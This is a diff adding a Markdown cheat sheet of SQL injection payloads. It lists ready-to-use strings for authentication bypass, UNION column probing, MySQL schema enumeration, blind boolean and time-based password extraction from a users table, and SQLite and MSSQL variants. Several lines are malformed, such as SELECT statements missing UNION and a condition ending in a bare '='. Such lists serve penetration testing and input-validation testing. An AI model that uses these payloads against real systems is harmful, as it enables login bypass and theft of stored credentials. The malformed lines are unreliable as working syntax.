@@ -1,0 +1,48 @@
+# SQL Injection Payloads
+
+## Authentication Bypass
+' OR '1'='1
+' OR 1=1--
+" OR ""="
+admin' --
+' OR 'a'='a
+' OR 1=1#
+') OR '1'='1
+') OR '1'='1'--
+
+## Union Helper
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+## Information Schema (MySQL)
+' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()--
+' SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+
+## Blind Boolean
+' AND (SELECT SUBSTRING(password,1,1)='a' FROM users LIMIT 1)=
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>90
+
+## Time Based (MySQL)
+' AND IF(1=1,SLEEP(5),0)--
+' OR SLEEP(5)-- 
+
+## SQLite
+' || (SELECT sql FROM sqlite_master LIMIT 1) ||
+' UNION SELECT sql,null FROM sqlite_master--
+
+## MSSQL
+'; IF (1=1) WAITFOR DELAY '00:00:05'--
+'; SELECT IS_SRVROLEMEMBER('sysadmin')--
+
+## Generic
+'
+"
+`
+);
+")
+');
